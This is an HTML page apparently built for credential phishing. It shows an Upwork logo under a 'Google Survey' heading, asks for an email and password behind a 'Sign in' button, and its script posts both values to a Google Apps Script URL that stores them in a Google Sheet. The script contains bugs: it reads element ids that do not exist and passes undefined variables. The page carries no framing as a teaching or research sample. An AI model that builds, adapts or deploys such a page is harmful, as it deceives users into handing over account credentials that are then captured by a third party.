<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UpWork- Ranjitha Ranganath</title>
    <style>
        /* Use Flexbox to center content horizontally and vertically */
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        .container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #f4f4f4;
        }

        form {
            display: inline-block;
            text-align: left;
        }

        label, input {
            display: block;
            margin: 10px 0;
        }

        input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        button:hover {
            background-color: #45a049;
        }

        .eye-icon {
            position: relative;
        }

        .eye-icon i {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
        <h1>Google Survey</h1>

        <form id="survey-form" onsubmit="handleSubmit(event)">
            <!-- Email Field -->
            <label for="email">Email</label>
            <input 
                type="email" 
                id="email" 
                name="email" 
                minlength="10" 
                pattern=".*@.*" 
                placeholder="Enter a valid email" 
                required
            >
            
            <!-- Password Field -->
            <label for="password">Password</label>
            <div class="eye-icon">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    minlength="6" 
                    placeholder="Enter password" 
                    required
                >
                <i onclick="togglePasswordVisibility()">üëÅÔ∏è</i>
            </div>
            
            <!-- Submit Button -->
            <button type="submit">Sign in</button>
        </form>
    </div>

    <script>
        // Toggle Password Visibility
        function togglePasswordVisibility() {
            const passwordField = document.getElementById("password");
            if (passwordField.type === "password") {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        }

        // Handle Form Submission
        function handleSubmit(event) {
            event.preventDefault(); // Prevent default form submission
            
            // Get form inputs
            const email = document.getElementById("Email").value;
            const password = document.getElementById("Password").value;

            // Validate Email and Password conditions
            if (!email || email.length < 10 || !email.includes('@')) {
                alert("Please enter a valid email (at least 10 characters and include '@').");
                return;
            }

            if (!password || password.length < 6) {
                alert("Please enter a valid password (at least 6 characters).");
                return;
            }

            // Save to Google Sheets (No redirection to Google Form)
            saveToGoogleSheet(Email, Password)
                .then(() => {
                    alert("Data saved successfully!"); // Confirm data save
                })
                .catch((error) => {
                    // Handle any errors that occurred during the save
                    console.error("Error saving data:", error);
                    alert("There was an issue saving your data. Please try again.");
                });
        }

        // Save Data to Google Sheets
        function saveToGoogleSheet(email, password) {
            const scriptURL = "https://script.google.com/macros/s/AKfycbxwG7icHP31MmuTtfvyFojIJtguQ0eXtAPXvAXWi-ApBSAlErgKJnuoxuG4nj99urg/exec"; // Replace with your script URL
            return fetch(scriptURL, {
                method: "POST",
                body: new URLSearchParams({ email, password })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error("Failed to save data to Google Sheets");
                }
                console.log("Data saved successfully!");
            })
            .catch(error => {
                console.error("Error saving to Google Sheets:", error.message);
                throw error;  // Re-throw the error to be caught in handleSubmit
            });
        }
    </script>
</body>
</html>
